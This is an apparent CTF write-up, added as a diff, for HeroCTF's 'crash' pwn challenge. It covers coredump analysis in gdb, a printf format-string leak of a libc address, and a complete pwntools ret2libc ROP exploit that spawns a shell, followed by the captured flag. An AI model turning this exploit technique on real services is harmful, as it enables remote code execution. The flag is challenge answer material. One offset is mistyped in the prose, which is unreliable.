@@ -1,0 +1,103 @@
+# crash #pwn 
+---
+In this challenge we are given a coredump file and are tasked with reproducing the exploit to pwn the remote instance. I've seen a challenge like this once before in swamp ctf a few months ago but that one was much harder. 
+
+We can examine the coredump in gdb with `gdb -core ./core` 
+
+![](IMG-20251128172844589.png)
+- stack pointer shows that RIP should be overwritten 
+
+Looks like a classic buffer overflow. However the function hasn't returned yet so rip is not yet "AAAAAAAA". 
+
+```
+0x559a70f151b7    add byte ptr [rax], al
+```
+
+The program crashes in a loop adding the lowest byte of rax to the memory pointed to by rax. 
+
+We can take a look at the stack to see what the potential buffer size and overflow might be. 
+
+![](IMG-20251128190007363.png)
+- it looks like bytes 40-48 end up overwriting `rip`
+
+If we dump all the instructions in the executable section of the binary into a file and look at it we will see it is filled with the same `add byte ptr [rax], al` instruction. This points to the fact that entire section is just null bytes and if this is the case we will not be able to figure out what any functions does. 
+
+Time for another plan, 
+
+If we run strings on the core file we can see a list of libc functions possibly used in the original binary.
+
+![](IMG-20251128234031318.png)
+
+If we take a look at the remote instance we see our input is printed back to us, 
+
+```sh
+➜ nc dyn04.heroctf.fr 10408
+Name :
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADescription :
+
+```
+
+We did see `printf` in the strings output so we can piece together a potential format string vulnerability if `printf` is called on our input.  
+
+```sh
+➜ nc dyn04.heroctf.fr 10408
+Name :
+%p %p %p %p %p %p %p %p
+0x1 0x1 0x7 0x1 (nil) 0x7fff12d7d698 0x7fff12d7d540 0x7fff12d7d580Description :
+```
+
+From here if we leak a libc address we can construct a full rop chain with libc addresses only. 
+
+![](IMG-20251129150257429.png)
+
+With `%p` we are essentially printing pointers on the stack, this means if we examine the stack of the coredump in gdb we should find the same libc address ending in `24a` that we can use to calculate the base libc address. 
+
+![](IMG-20251129150924161.png)
+- (challenge gives us a dockerfile so we are examining in the docker container which is important as the container's libc is the same as the remote system's libc)
+
+Now `info proc mappings` will show us the base libc address and we can calculate the offset to the base address from there. 
+
+![](IMG-20251129151723298.png)
+- the offset is `0x2724a`
+
+Therefore `leak - 0x2742a` will give us the base libc address. From here the exploit is trivial, we get all our gadgets from libc and construct a rop chain to exploit the buffer overflow in the 2nd input.
+
+```python fold
+libc = ELF('./libc.so.6', checksec=False)
+p = start()
+
+p.sendline(b'%p ' * 20)
+data = p.recvuntil(b'Description :')
+libc_leak = data[240:252].decode()
+libc_leak = bytes.fromhex(libc_leak)
+libc_leak = int(libc_leak.hex(), 16)
+print(f"libc = {hex(libc_leak)}")
+
+libc.address = libc_leak - 0x2724a
+bin_sh = next(libc.search(b"/bin/sh"))
+system = libc.symbols['system']
+pop_rdi = libc.address + 0x277e5
+ret = libc.address + 0x26e99
+print(f"binsh = {hex(bin_sh)}")
+print(f"system = {hex(system)}")
+print(f"pop rdi = {hex(pop_rdi)}")
+print(f"libc ret = {hex(ret)}")
+
+payload = b'A' * 40      # buffer is 32 bytes + 8 to overwrite rbp 
+payload += p64(ret)      # ret gadget to align stack to 16 bytes 
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(system)
+
+p.sendline(payload)
+
+p.interactive()
+```
+- xpl.py 
+
+```sh
+$ cat flag.txt
+Hero{d2d8c417232c1b8e0abc91b8a542e55259ebbac5}
+```
+
